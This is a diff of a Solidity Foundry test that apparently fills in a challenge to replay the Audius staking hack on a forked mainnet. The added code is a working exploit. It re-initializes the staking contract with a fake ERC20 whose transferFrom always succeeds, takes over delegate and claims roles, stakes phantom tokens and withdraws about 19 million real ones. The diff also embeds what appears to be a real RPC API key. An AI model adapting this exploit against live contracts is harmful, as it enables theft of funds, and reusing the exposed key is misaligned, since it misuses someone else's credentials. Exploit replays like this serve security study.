@@ -18,7 +18,8 @@ contract ContractTest is DSTest {
     Registry reg;
     AudiusToken token;
 
-    address constant private VM_ADDRESS = address(bytes20(uint160(uint256(keccak256('hevm cheat code')))));
+    address private constant VM_ADDRESS =
+        address(bytes20(uint160(uint256(keccak256("hevm cheat code")))));
     Vm public constant vm = Vm(VM_ADDRESS);
 
     function setUp() public {
@@ -30,12 +31,47 @@ contract ContractTest is DSTest {
     }
 
     function testAudiusHack() public {
-        vm.createSelectFork("INSERT MAINNET RPC", 15201700);
+        vm.createSelectFork(
+            "https://eth-mainnet.g.alchemy.com/v2/NsixqnW3NZrQWYxL7uqxtv36t3t6LlfY",
+            15201700
+        );
         console.log("Audius Balance: ", token.balanceOf(address(this)));
 
         // HACK AWAY! (Don't forget you can use vm.roll(newBlock) to simulate multiple blocks)
-
+        vm.label(address(st), "staking contract");
+        FakeERC20Token fk = new FakeERC20Token();
+        vm.roll(block.number + 100);
+        st.initialize(address(fk), address(this));
+        st.setDelegateManagerAddress(address(this));
+        st.setClaimsManagerAddress(address((this)));
+        st.delegateStakeFor(address(this), address(this), 19_000_000 * 10**18);
+        st.stakeRewards(19_000_000 * 10**18, address(this));
+        st.initialize(address(token), address(this));
+        st.undelegateStakeFor(
+            address(this),
+            address(this),
+            19_000_000 * 10**18
+        );
+        emit log_uint(token.balanceOf(address(st)));
+        emit log_uint(token.balanceOf(address(dm)));
         console.log("Audius Balance: ", token.balanceOf(address(this)));
-        require(token.balanceOf(address(this)) > 18_000_000 ether, "do better!");
+        require(
+            token.balanceOf(address(this)) > 18_000_000 ether,
+            "do better!"
+        );
+    }
+
+    function isGovernanceAddress() public returns (bool) {
+        return true;
+    }
+}
+
+contract FakeERC20Token {
+    function transferFrom(
+        address from,
+        address to,
+        uint256 amount
+    ) public returns (bool) {
+        return true;
     }
 }
